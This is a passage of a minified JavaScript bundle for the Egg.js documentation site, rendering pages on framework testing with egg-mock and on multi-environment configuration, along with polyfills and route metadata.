\u9ed8\u8ba4\u6709\u7f13\u5b58\uff0c\u5f53\u7b2c\u4e00\u6b21\u52a0\u8f7d\u8fc7\u540e\u518d\u6b21\u52a0\u8f7d\u4f1a\u76f4\u63a5\u8bfb\u53d6\u7f13\u5b58\uff0c\u90a3\u4e48\u8bbe\u7f6e\u7684\u73af\u5883\u4e5f\u4e0d\u4f1a\u751f\u6548\u3002"),r.a.createElement(o["a"],{code:"const mock = require('egg-mock');\ndescribe('/test/index.test.js', () => {\n  let app;\n  afterEach(() => app.close());\n\n  it('should test on local', () => {\n    mock.env('local');\n    app = mock.app({\n      baseDir: 'apps/example',\n      framework: true,\n      cache: false,\n    });\n    return app.ready();\n  });\n  it('should test on prod', () => {\n    mock.env('prod');\n    app = mock.app({\n      baseDir: 'apps/example',\n      framework: true,\n      cache: false,\n    });\n    return app.ready();\n  });\n});",lang:"js"}),r.a.createElement("h3",{id:"\u591a\u8fdb\u7a0b\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u591a\u8fdb\u7a0b\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u591a\u8fdb\u7a0b\u6d4b\u8bd5"),r.a.createElement("p",null,"\u5f88\u5c11\u573a\u666f\u4f1a\u4f7f\u7528\u591a\u8fdb\u7a0b\u6d4b\u8bd5\uff0c\u56e0\u4e3a\u591a\u8fdb\u7a0b\u65e0\u6cd5\u8fdb\u884c API \u7ea7\u522b\u7684 mock \u5bfc\u81f4\u6d4b\u8bd5\u6210\u672c\u5f88\u9ad8\uff0c\u800c\u8fdb\u7a0b\u5728\u6709\u8986\u76d6\u7387\u7684\u573a\u666f\u542f\u52a8\u5f88\u6162\uff0c\u6d4b\u8bd5\u4f1a\u8d85\u65f6\u3002\u4f46\u591a\u8fdb\u7a0b\u6d4b\u8bd5\u662f\u9a8c\u8bc1\u591a\u8fdb\u7a0b\u6a21\u578b\u6700\u597d\u7684\u65b9\u5f0f\uff0c\u8fd8\u53ef\u4ee5\u6d4b\u8bd5 stdout \u548c stderr\u3002"),r.a.createElement("p",null,"\u591a\u8fdb\u7a0b\u6d4b\u8bd5\u548c ",r.a.createElement("code",null,"mm.app")," \u53c2\u6570\u4e00\u81f4\uff0c\u4f46 app \u7684 API \u5b8c\u5168\u4e0d\u540c\uff0c\u4e0d\u8fc7 SuperTest \u4f9d\u7136\u53ef\u7528\u3002"),r.a.createElement(o["a"],{code:"const mock = require('egg-mock');\ndescribe('/test/index.test.js', () => {\n  let app;\n  before(() => {\n    app = mock.cluster({\n      baseDir: 'apps/example',\n      framework: true,\n    });\n    return app.ready();\n  });\n  after(() => app.close());\n  afterEach(mock.restore);\n  it('should success', () => {\n    return app.httpRequest().get('/').expect(200);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u591a\u8fdb\u7a0b\u6d4b\u8bd5\u8fd8\u53ef\u4ee5\u6d4b\u8bd5 stdout/stderr\uff0c\u56e0\u4e3a ",r.a.createElement("code",null,"mm.cluster")," \u662f\u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"https://github.com/popomore/coffee"},"coffee")," \u6269\u5c55\u7684\uff0c\u53ef\u8fdb\u884c\u8fdb\u7a0b\u6d4b\u8bd5\u3002"),r.a.createElement(o["a"],{code:"const mock = require('egg-mock');\ndescribe('/test/index.test.js', () => {\n  let app;\n  before(() => {\n    app = mock.cluster({\n      baseDir: 'apps/example',\n      framework: true,\n    });\n    return app.ready();\n  });\n  after(() => app.close());\n  it('should get `started`', () => {\n    // \u5224\u65ad\u7ec8\u7aef\u8f93\u51fa\n    app.expect('stdout', /started/);\n  });\n});",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"TFV/":function(e,t,n){var a=n("0mt+"),r=n("MwLW").entries;a({target:"Object",stat:!0},{entries:function(e){return r(e)}})},TGtL:function(e,t,n){"use strict";var a=n("G0Yp"),r=n("FU0I");t.useSubscription=function(e){var t=e.getCurrentValue,n=e.subscribe,l=r.useState((function(){return{getCurrentValue:t,subscribe:n,value:t()}}));e=l[0];var o=l[1];return l=e.value,e.getCurrentValue===t&&e.subscribe===n||(l=t(),o({getCurrentValue:t,subscribe:n,value:l})),r.useDebugValue(l),r.useEffect((function(){function e(){if(!r){var e=t();o((function(r){return r.getCurrentValue!==t||r.subscribe!==n||r.value===e?r:a({},r,{value:e})}))}}var r=!1,l=n(e);return e(),function(){r=!0,l()}}),[t,n]),l}},TUCT:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("G9w8"),i=n("BZjo"),c=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{find:function(e){var t=l(this),n=i(t),a=o(e,arguments.length>1?arguments[1]:void 0,3);return c(n,(function(e){if(a(e,e,t))return c.stop(e)}),void 0,!1,!0).result}})},TV4u:function(e,t,n){var a=n("0mt+");a({target:"Math",stat:!0},{RAD_PER_DEG:180/Math.PI})},TVTq:function(e,t,n){var a=n("63+Q"),r=n("M+A8"),l=r.concat("length","prototype");t.f=Object.getOwnPropertyNames||function(e){return a(e,l)}},TYe2:function(e,t,n){var a=n("+0HW"),r=n("GIAz"),l=n("q7Pv"),o=l("iterator");e.exports=function(e){if(void 0!=e)return e[o]||e["@@iterator"]||r[a(e)]}},Tgko:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"This framework provides powerful and extensible configuration function, including automatically merging applications, plugins, and framework's configuration. In addition, it allows users to overwrite configuration in sequence and maintain different configs depending on different environments. The result (i.e. merged config) can be accessed from ",r.a.createElement("code",null,"app.config "),"."),r.a.createElement("p",null,"Here are some common control tactics:"),r.a.createElement("ol",null,r.a.createElement("li",null,"Using platform to manage configurations: while building a new application, you can put the current environment configuration into package and trigger the configuration as long as you run this application. But this certain application won't be able to build several deployments at once, and you will get into trouble whenever you want to use the configuration in localhost."),r.a.createElement("li",null,"Using platform to manage configurations: you can pass the current environment configuration via environment variables while starting. This is a relatively elegant approach with higher requirement on operation and support from configuration platform. Moreover, The configuration environment has same flaws as first method."),r.a.createElement("li",null,"Using code to manage configurations: you can add some environment configurations in codes and pass them to current environment arguments while starting. However, it doesn't allow you to configure globally and you need to alter your code whenever you want to change the configuration.")),r.a.createElement("p",null,"we choose the last strategy, namely ",r.a.createElement("strong",null,"configure with code"),", The change of configuration should be also released after reviewing. The application package itself is capable to be deployed in several environments, only need to specify the running environment."),r.a.createElement("h3",{id:"multiple-environment-configuration"},r.a.createElement(l["AnchorLink"],{to:"#multiple-environment-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Multiple Environment Configuration"),r.a.createElement("p",null,"This framework supports loading configuration according to the environment and defining configuration files of multiple environments. For more details, please check ",r.a.createElement(l["Link"],{to:"../basics/env"},"env"),"."),r.a.createElement(o["a"],{code:"config\n|- config.default.js\n|- config.prod.js\n|- config.unittest.js\n|- config.local.js",lang:"unknown"}),r.a.createElement("p",null,r.a.createElement("code",null,"config.default.js")," is the default file for configuration, and all environments will load this file. Besides, this is usually used as default configuration file for development environment."),r.a.createElement("p",null,"The corresponding configuration file(named configuration) will be loaded simultaneously when you set up env. The named configuration and the default configuration will combine(use ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/extend2"},"extend2")," deep clone) into a configuration eventually. And the same name will be overwritten. For example, ",r.a.createElement("code",null,"prod")," environment will load ",r.a.createElement("code",null,"config.prod.js")," and ",r.a.createElement("code",null,"config.default.js"),". As a result, ",r.a.createElement("code",null,"config.prod.js")," will overwrite the configuration with identical name in ",r.a.createElement("code",null,"config.default.js"),"."),r.a.createElement("h3",{id:"how-to-write-configuration"},r.a.createElement(l["AnchorLink"],{to:"#how-to-write-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Write Configuration"),r.a.createElement("p",null,"The configuration file returns an object which could overwrite some configurations in the framework. Application can put its own business configuration into it for convenient management."),r.a.createElement(o["a"],{code:"// configure the catalog of logger\uff0cthe default configuration of logger is provided by framework\nmodule.exports = {\n  logger: {\n    dir: '/home/admin/logs/demoapp',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"The configuration file can simplify to ",r.a.createElement("code",null,"exports.key = value")," format"),r.a.createElement(o["a"],{code:"exports.keys = 'my-cookie-secret-key';\nexports.logger = {\n  level: 'DEBUG',\n};",lang:"js"}),r.a.createElement("p",null,"The configuration file can also return a function which could receive a parameter called ",r.a.createElement("code",null,"appInfo")),r.a.createElement(o["a"],{code:"// put the catalog of logger to the catalog of codes\nconst path = require('path');\nmodule.exports = (appInfo) => {\n  return {\n    logger: {\n      dir: path.join(appInfo.baseDir, 'logs'),\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"The build-in appInfo contains:"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"appInfo"),r.a.createElement("th",null,"elaboration"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"pkg"),r.a.createElement("td",null,"package.json")),r.a.createElement("tr",null,r.a.createElement("td",null,"name"),r.a.createElement("td",null,"Application name, same as pkg.name")),r.a.createElement("tr",null,r.a.createElement("td",null,"baseDir"),r.a.createElement("td",null,"The directory of codes")),r.a.createElement("tr",null,r.a.createElement("td",null,"HOME"),r.a.createElement("td",null,"User directory, e.g, the account of admin is /home/admin")),r.a.createElement("tr",null,r.a.createElement("td",null,"root"),r.a.createElement("td",null,"The application root directory, if the environment is local or unittest, it is baseDir. Otherwise, it is HOME")))),r.a.createElement("p",null,r.a.createElement("code",null,"appInfo.root")," is an elegant adaption. for example, we tend to use ",r.a.createElement("code",null,"/home/admin/logs")," as the catalog of log in the server environment, while we don't want to pollute the user catalog in local development. This adaptation is very good at solving this problem."),r.a.createElement("p",null,"Choose the appropriate style according to the specific situation, but please make sure you don't make mistake like the code below:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.someKeys = 'abc';\nmodule.exports = (appInfo) => {\n  const config = {};\n  config.keys = '123456';\n  return config;\n};",lang:"js"}),r.a.createElement("h3",{id:"sequence-of-loading-configurations"},r.a.createElement(l["AnchorLink"],{to:"#sequence-of-loading-configurations","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Sequence of Loading Configurations"),r.a.createElement("p",null,"Applications, plugin components and framework are able to define those configs. Even though the structure of catalog is identical but there is priority (application > framework > plugin). Besides, the running environment has the higher priority."),r.a.createElement("p",null,'Here is one sequence of loading configurations under "prod" environment, in which the following configuration will overwrite the previous configuration with the same name.'),r.a.createElement(o["a"],{code:"-> plugin config.default.js\n-> framework config.default.js\n-> application config.default.js\n-> plugin config.prod.js\n-> framework config.prod.js\n-> application config.prod.js",lang:"unknown"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: there will be plugin loading sequence, but the approximate order is similar. For specific logic, please check the ",r.a.createElement(l["Link"],{to:"../advanced/loader"},"loader")," .")),r.a.createElement("h3",{id:"rules-of-merging"},r.a.createElement(l["AnchorLink"],{to:"#rules-of-merging","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Rules of Merging"),r.a.createElement("p",null,"Configs are merged using deep copy from [extend2] module, which is forked from [extend] and process array in a different way."),r.a.createElement(o["a"],{code:"const a = {\n  arr: [1, 2],\n};\nconst b = {\n  arr: [3],\n};\nextend(true, a, b);\n// => { arr: [ 3 ] }",lang:"js"}),r.a.createElement("p",null,"As demonstrated above, the framework will overwrite arrays instead of merging them."),r.a.createElement("h3",{id:"configuration-result"},r.a.createElement(l["AnchorLink"],{to:"#configuration-result","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configuration Result"),r.a.createElement("p",null,"The final merged config will be dumped to ",r.a.createElement("code",null,"run/application_config.json"),"(for worker process) and ",r.a.createElement("code",null,"run/agent_config.json"),"(for agent process) when the framework started, which can help analyzing problems."),r.a.createElement("p",null,"Some fields are hidden in the config file, mainly including 2 types:"),r.a.createElement("ul",null,r.a.createElement("li",null,"like passwords, secret keys and other security related fields which can be configured in ",r.a.createElement("code",null,"config.dump.ignore")," and only ",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set"},"Set")," type is accepted. See ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/config/config.default.js"},"Default Configs")),r.a.createElement("li",null,"like Function, Buffer, etc. whose content converted by ",r.a.createElement("code",null,"JSON.stringify")," will be specially large.")),r.a.createElement("p",null,r.a.createElement("code",null,"run/application_config_meta.json")," (for worker process\uff09and ",r.a.createElement("code",null,"run/agent_config_meta.json")," (for agent process) will also be dumped in order to check which file defines the property, see below"),r.a.createElement(o["a"],{code:'{\n  "logger": {\n    "dir": "/path/to/config/config.default.js"\n  }\n}',lang:"json"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},Tgud:function(e,t){function n(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}e.exports=n,e.exports.__esModule=!0,e.exports["default"]=e.exports},Ti9N:function(e,t,n){"use strict";var a=n("MAgz"),r=n("MPZC"),l=a.aTypedArrayConstructor,o=a.exportTypedArrayStaticMethod;o("of",(function(){var e=0,t=arguments.length,n=new(l(this))(t);while(t>e)n[e]=arguments[e++];return n}),r)},TmB2:function(e,t,n){"use strict";n.r(t);var a={};n.r(a),n.d(a,"onRouteChange",(function(){return c}));var r={};n.r(r),n.d(r,"rootContainer",(function(){return h}));var l={};n.r(l),n.d(l,"rootContainer",(function(){return j}));n("rwYS"),n("XuDl"),n("yKrg"),n("6TCi"),n("bcNs"),n("c3Uy"),n("6CDp"),n("OhDZ"),n("b5FV"),n("y64K"),n("B/O9"),n("e9aW"),n("60aI"),n("zXC1"),n("BD8q"),n("2Mxh"),n("DsNR"),n("NKsF"),n("Dp1q"),n("69j1"),n("0Qxj"),n("MW8C"),n("VnG/"),n("jTOb"),n("bSD4"),n("tLo1"),n("u7uH"),n("wWB+"),n("zHUK"),n("Oaqu"),n("37Ld"),n("P2oP"),n("GK2W"),n("zd4E"),n("Q+FJ"),n("Z6Ce"),n("Bscc"),n("//sA"),n("ieTO"),n("16wp"),n("h22t"),n("acvX"),n("67jT"),n("PdaW"),n("mqtR"),n("hzAS"),n("TFV/"),n("POO6"),n("Deab"),n("H6EV"),n("ju0s"),n("St/g"),n("IwpU"),n("WAUu"),n("nVgL"),n("9XUD"),n("hHTQ"),n("+3ML"),n("qFz4"),n("ekdb"),n("E6W8"),n("S/RT"),n("wKda"),n("nBv4"),n("RcAc"),n("ihx8"),n("FBfE"),n("R29r"),n("Ql9K"),n("CPOg"),n("E94j"),n("5g1I"),n("P64i"),n("1or5"),n("jBb1"),n("G/H9"),n("uDzu"),n("iGuS"),n("Io2v"),n("vwEN"),n("BHsk"),n("EX3u"),n("9djW"),n("EXoo"),n("VWWG"),n("arOp"),n("DrWk"),n("DPWy"),n("yptB"),n("DWfO"),n("Ti9N"),n("1G6B"),n("pBhg"),n("DSqS"),n("riNG"),n("NXx9"),n("a9w1"),n("BOmv"),n("1kAJ"),n("Bcn0"),n("Gzht"),n("z/Sa"),n("fruO"),n("+ljs"),n("Cplx"),n("hb7R"),n("IsRm"),n("MCGb"),n("SN3B"),n("s97C"),n("brgB"),n("uoOj"),n("r+rm"),n("68x4"),n("tlk/"),n("jNQk"),n("C2xF"),n("Jx+A"),n("rJ1j"),n("dX65"),n("ANeZ"),n("ggxN"),n("gI5j"),n("wJ6r"),n("OJ6K"),n("GD5l"),n("Ytgo"),n("TV4u"),n("fpG+"),n("c5h7"),n("rDUL"),n("hdNB"),n("41sL"),n("ZsXs"),n("LT88"),n("2gVC"),n("F+1Y"),n("tc2K"),n("Eh57"),n("b3Qd"),n("LrkD"),n("JnuT"),n("gei9"),n("mCYO"),n("UYZS"),n("HZZr"),n("QWDv"),n("Qfme"),n("Db4z"),n("QlRj"),n("WMSp"),n("CSfq"),n("TUCT"),n("/xLo"),n("FF6X"),n("d2/7"),n("8tIg"),n("kIuA"),n("JXBY"),n("O20g"),n("X9n9"),n("LyaT"),n("yZ1w"),n("tPrM"),n("estG"),n("YRGx"),n("szvL"),n("Bf0c"),n("PCpU"),n("dbDl"),n("SWZC"),n("jXIH"),n("IhsX"),n("1MN/"),n("ouRp"),n("SX5a"),n("7ikL"),n("w1zT"),n("KKLt"),n("y/MD"),n("5OIK"),n("4sdT"),n("vKrK"),n("xSlR"),n("g2OC"),n("vKfd"),n("tzIS"),n("UKi4");var o=n("dzlB"),i=n("zzMO");function c(e){var t=e.location,n=t.pathname;n.startsWith("/en")&&(n=n.replace("/en",""),n=n.replace(".html",""),i["a"].push(n)),n.startsWith("/zh-cn")&&(n=n.replace("zh-cn","zh-CN"),n=n.replace(".html",""),i["a"].push(n))}var s=n("FU0I"),u=n.n(s),d=n("310B"),m=n("e5XM");if("function"!==typeof m["a"])throw new Error("[plugin-initial-state]: useModel is not a function, @umijs/plugin-model is required.");var p=e=>{var t=e.children,n=Object(s["useRef"])(!1),a=i["b"].applyPlugins({key:"initialStateConfig",type:d["ApplyPluginsType"].modify,initialValue:{}})||{},r=Object(m["a"])("@@initialState")||{},l=r.loading,o=void 0!==l&&l;return Object(s["useEffect"])((()=>{o||(n.current=!0)}),[o]),o&&!n.current?a.loading||null:t};function h(e){return u.a.createElement(p,null,e)}var g=n("Gaq5"),f=()=>({loading:!1,refresh:()=>{}});class E{constructor(){this.callbacks={},this.data={},this.update=e=>{(this.callbacks[e]||[]).forEach((t=>{try{var n=this.data[e];t(n)}catch(a){t(void 0)}}))}}}var b=e=>{var t=e.hook,n=e.onUpdate,a=e.namespace,r=Object(s["useRef"])(n);r.current=n;var l,o=Object(s["useRef"])(!1);try{l=t()}catch(i){console.error("plugin-model: Invoking '".concat(a||"unknown","' model failed:"),i)}return Object(s["useMemo"])((()=>{r.current(l),o.current=!1}),[]),Object(s["useEffect"])((()=>{o.current?r.current(l):o.current=!0})),u.a.createElement(u.a.Fragment,null)},v=n("PiIT"),y={"@@initialState":f},k=new E,w=b,x=e=>{var t=e.children;return u.a.createElement(v["a"].Provider,{value:k},Object.entries(y).map((e=>u.a.createElement(w,{key:e[0],namespace:e[0],hook:e[1],onUpdate:t=>{var n=e,a=Object(g["a"])(n,1),r=a[0];k.data[r]=t,k.update(r)}}))),t)};function j(e){return u.a.createElement(x,null,e)}o["a"].register({apply:a,path:"../../app.ts"}),o["a"].register({apply:r,path:"../plugin-initial-state/runtime"}),o["a"].register({apply:l,path:"../plugin-model/runtime"});var S=n("N4K1"),C=n("PBCt");function A(){var e=[{path:"/~demos/:uuid",layout:!1,wrappers:[n("7luJ").default],component:e=>{var t=n("FU0I"),a=n("43d4"),r=a.default,l=n("8+XA"),o=l.default,i=n("j00X"),c=i.usePrefersColor,s=i.context,u=t.useContext(s),d=u.demos,m=t.useState([]),p=Object(g["a"])(m,2),h=p[0],f=p[1];switch(t.useLayoutEffect((()=>{f(r(e,d))}),[e.match.params.uuid,e.location.query.wrapper,e.location.query.capture]),c(),h.length){case 1:return h[0];case 2:return t.createElement(o,h[0],h[1]);default:return"Demo ".concat(e.match.params.uuid," not found :(")}}},{path:"/_demos/:uuid",redirect:"/~demos/:uuid"},{__dumiRoot:!0,layout:!1,path:"/",wrappers:[n("7luJ").default,n("dj3V").default],routes:[{path:"/",component:n("rj5E").default,exact:!0,meta:{filePath:"site/docs/index.md",updatedTime:1687656833e3,title:"egg - Born to build better enterprise frameworks and apps",hero:{desc:'<div class="markdown"><p>Born to build better enterprise frameworks and apps</p></div>'},egg:{info:{title:"Born to build",desc:"better enterprise frameworks and apps with Node.js & Koa",content:"Born to build better enterprise frameworks and apps"},guide:{title:"Get Started",link:"/intro/quickstart"},features:[{title:"Complete ecology",desc:"Based on open source ecology, customized for ant-ecology, can be integrated to backend middleware in one minute, supporting multiple depolyment enviroments.",icon:"/img_egg/icon-3.png"},{title:"Efficient and natural development experience.",desc:"Progressive development, smooth learning curve, one-stop development kit, supporting your whole process of development.",icon:"/img_egg/icon-4.png"},{title:"High Quality & Reliability",desc:"With high-quality, complete tests, built-in security policy, withstanded the larggest amout of traffic like Double 11 Promotion.",icon:"/img_egg/icon-2.png"},{title:"Flexiable & High scalability",desc:"Convention over configuration, highly flexible customization, industry-leading plugin systems and upper-layer business-specific framework systems.",icon:"/img_egg/icon-1.png"}]},slugs:[]},title:"egg - Born to build better enterprise frameworks and apps - Egg"},{path:"/zh-CN",component:n("ad52").default,exact:!0,meta:{filePath:"site/docs/index.zh-CN.md",updatedTime:1687656833e3,title:"egg - \u4e3a\u4f01\u4e1a\u7ea7\u6846\u67b6\u548c\u5e94\u7528\u800c\u751f",hero:{desc:'<div class="markdown"><p>Born to build better enterprise frameworks and apps</p></div>'},egg:{info:{title:"Born to build",desc:"better enterprise frameworks and apps with Node.js & Koa",content:"\u4e3a\u4f01\u4e1a\u7ea7\u6846\u67b6\u548c\u5e94\u7528\u800c\u751f"},guide:{title:"\u5f00\u59cb\u4f7f\u7528",link:"/zh-CN/intro/quickstart"},features:[{title:"\u5b8c\u5584\u7684\u751f\u6001",desc:"\u57fa\u4e8e\u5f00\u6e90\u751f\u6001\uff0c\u4e13\u4e3a\u6cdb\u8682\u8681\u751f\u6001\u5b9a\u5236\uff0c\u4e00\u5206\u949f\u63a5\u5165\u540e\u7aef\u670d\u52a1\u4e2d\u95f4\u4ef6\uff0c\u652f\u6301\u591a\u79cd\u90e8\u7f72\u73af\u5883\u3002",icon:"/img_egg/icon-3.png"},{title:"\u9ad8\u6548\u81ea\u7136\u7684\u7814\u53d1\u4f53\u9a8c",desc:"\u6e10\u8fdb\u5f0f\u5f00\u53d1\uff0c\u5b66\u4e60\u66f2\u7ebf\u5e73\u6ed1\uff0c\u63d0\u4f9b\u4e00\u7ad9\u5f0f\u5f00\u53d1\u5957\u4ef6\uff0c\u4e3a\u7814\u53d1\u5168\u6d41\u7a0b\u4fdd\u9a7e\u62a4\u822a\u3002",icon:"/img_egg/icon-4.png"},{title:"\u9ad8\u8d28\u91cf\u3001\u53ef\u4fe1\u8d56",desc:"\u9ad8\u8d28\u91cf\uff0c\u5b8c\u5907\u7684\u6d4b\u8bd5\uff0c\u5185\u7f6e\u96c6\u56e2\u5b89\u5168\u7b56\u7565\uff0c\u53cc\u5341\u4e00\u7b49\u7ebf\u4e0a\u5927\u89c4\u6a21\u9876\u7ea7\u6d41\u91cf\u538b\u529b\u8003\u9a8c\u3002",icon:"/img_egg/icon-2.png"},{title:"\u7075\u6d3b\u3001\u9ad8\u6269\u5c55\u6027",desc:"\u7ea6\u5b9a\u4f18\u4e8e\u914d\u7f6e\uff0c\u9ad8\u5ea6\u7075\u6d3b\u7684\u5b9a\u5236\u6027\uff0c\u4e1a\u754c\u9886\u5148\u7684\u63d2\u4ef6\u673a\u5236\u548c\u4e0a\u5c42\u4e1a\u52a1\u6846\u67b6\u673a\u5236\u3002",icon:"/img_egg/icon-1.png"}]},slugs:[],locale:"zh-CN"},title:"egg - \u4e3a\u4f01\u4e1a\u7ea7\u6846\u67b6\u548c\u5e94\u7528\u800c\u751f - Egg"},{path:"/advanced/cluster-client",component:n("NLWe").default,exact:!0,meta:{filePath:"site/docs/advanced/cluster-client.md",updatedTime:1687656833e3,title:"Multi-Process Development Model Enhancement",order:4,slugs:[{depth:2,value:"Core Idea",heading:"core-idea"},{depth:2,value:"Client Interface Type Abstraction",heading:"client-interface-type-abstraction"},{depth:2,value:"Exception Handling",heading:"exception-handling"},{depth:2,value:"Protocol and Time Series to Invoke",heading:"protocol-and-time-series-to-invoke"},{depth:2,value:"Specific Usage",heading:"specific-usage"},{depth:2,value:"The Configuration Items Related to Cluster-Client in the Framework",heading:"the-configuration-items-related-to-cluster-client-in-the-framework"}],nav:{path:"/advanced",title:"Advanced"}},title:"Multi-Process Development Model Enhancement - Egg"},{path:"/zh-CN/advanced/cluster-client",component:n("83wk").default,exact:!0,meta:{filePath:"site/docs/advanced/cluster-client.zh-CN.md",updatedTime:1687656833e3,title:"\u591a\u8fdb\u7a0b\u7814\u53d1\u6a21\u5f0f\u589e\u5f3a",order:4,slugs:[{depth:2,value:"\u6838\u5fc3\u601d\u60f3",heading:"\u6838\u5fc3\u601d\u60f3"},{depth:2,value:"\u5ba2\u6237\u7aef\u63a5\u53e3\u7c7b\u578b\u62bd\u8c61",heading:"\u5ba2\u6237\u7aef\u63a5\u53e3\u7c7b\u578b\u62bd\u8c61"},{depth:2,value:"\u5f02\u5e38\u5904\u7406",heading:"\u5f02\u5e38\u5904\u7406"},{depth:2,value:"\u534f\u8bae\u548c\u8c03\u7528\u65f6\u5e8f",heading:"\u534f\u8bae\u548c\u8c03\u7528\u65f6\u5e8f"},{depth:2,value:"\u5177\u4f53\u7684\u4f7f\u7528\u65b9\u6cd5",heading:"\u5177\u4f53\u7684\u4f7f\u7528\u65b9\u6cd5"},{depth:2,value:"\u5728\u6846\u67b6\u91cc\u9762 cluster-client \u76f8\u5173\u7684\u914d\u7f6e\u9879",heading:"\u5728\u6846\u67b6\u91cc\u9762-cluster-client-\u76f8\u5173\u7684\u914d\u7f6e\u9879"}],locale:"zh-CN",nav:{path:"/zh-CN/advanced",title:"\u8fdb\u9636"}},title:"\u591a\u8fdb\u7a0b\u7814\u53d1\u6a21\u5f0f\u589e\u5f3a - Egg"},{path:"/advanced/framework",component:n("F2oR").default,exact:!0,meta:{filePath:"site/docs/advanced/framework.md",updatedTime:1687656833e3,title:"Framework Development",order:3,slugs:[{depth:2,value:"Framework and Multiprocess",heading:"framework-and-multiprocess"},{depth:2,value:"How to Customize a Framework",heading:"how-to-customize-a-framework"},{depth:3,value:"Framework API",heading:"framework-api"},{depth:4,value:"egg.startCluster",heading:"eggstartcluster"},{depth:4,value:"egg.Application And egg.Agent",heading:"eggapplication-and-eggagent"},{depth:4,value:"egg.AppWorkerLoader and egg.AgentWorkerLoader",heading:"eggappworkerloader-and-eggagentworkerloader"},{depth:3,value:"Framework Extension",heading:"framework-extension"},{depth:3,value:"Principle of Framework Extension",heading:"principle-of-framework-extension"},{depth:3,value:"Custom Agent",heading:"custom-agent"},{depth:3,value:"Custom Loader",heading:"custom-loader"},{depth:2,value:"The principle of Launch",heading:"the-principle-of-launch"},{depth:2,value:"Framework Testing",heading:"framework-testing"},{depth:3,value:"Initiation",heading:"initiation"},{depth:3,value:"Cache",heading:"cache"},{depth:3,value:"Multipleprocess Testing",heading:"multipleprocess-testing"}],nav:{path:"/advanced",title:"Advanced"}},title:"Framework Development - Egg"},{path:"/zh-CN/advanced/framework",component:n("TDER").default,exact:!0,meta:{filePath:"site/docs/advanced/framework.zh-CN.md",updatedTime:1687656833e3,title:"\u6846\u67b6\u5f00\u53d1",order:3,slugs:[{depth:2,value:"\u6846\u67b6\u4e0e\u591a\u8fdb\u7a0b",heading:"\u6846\u67b6\u4e0e\u591a\u8fdb\u7a0b"},{depth:2,value:"\u5982\u4f55\u5b9a\u5236\u4e00\u4e2a\u6846\u67b6",heading:"\u5982\u4f55\u5b9a\u5236\u4e00\u4e2a\u6846\u67b6"},{depth:3,value:"\u6846\u67b6 API",heading:"\u6846\u67b6-api"},{depth:4,value:"egg.startCluster",heading:"eggstartcluster"},{depth:4,value:"egg.Application \u548c egg.Agent",heading:"eggapplication-\u548c-eggagent"},{depth:4,value:"egg.AppWorkerLoader \u548c egg.AgentWorkerLoader",heading:"eggappworkerloader-\u548c-eggagentworkerloader"},{depth:3,value:"\u6846\u67b6\u7ee7\u627f",heading:"\u6846\u67b6\u7ee7\u627f"},{depth:3,value:"\u6846\u67b6\u7ee7\u627f\u539f\u7406",heading:"\u6846\u67b6\u7ee7\u627f\u539f\u7406"},{depth:3,value:"\u81ea\u5b9a\u4e49 Agent",heading:"\u81ea\u5b9a\u4e49-agent"},{depth:3,value:"\u81ea\u5b9a\u4e49 Loader",heading:"\u81ea\u5b9a\u4e49-loader"},{depth:2,value:"\u6846\u67b6\u542f\u52a8\u539f\u7406",heading:"\u6846\u67b6\u542f\u52a8\u539f\u7406"},{depth:2,value:"\u6846\u67b6\u6d4b\u8bd5",heading:"\u6846\u67b6\u6d4b\u8bd5"},{depth:3,value:"\u521d\u59cb\u5316",heading:"\u521d\u59cb\u5316"},{depth:3,value:"\u7f13\u5b58",heading:"\u7f13\u5b58"},{depth:3,value:"\u591a\u8fdb\u7a0b\u6d4b\u8bd5",heading:"\u591a\u8fdb\u7a0b\u6d4b\u8bd5"}],locale:"zh-CN",nav:{path:"/zh-CN/advanced",title:"\u8fdb\u9636"}},title:"\u6846\u67b6\u5f00\u53d1 - Egg"},{path:"/advanced",component:n("8if0").default,exact:!0,meta:{filePath:"site/docs/advanced/index.md",updatedTime:1687656833e3,title:"Advanced",order:0,nav:{title:"Advanced",order:5,path:"/advanced"},slugs:[]},title:"Advanced - 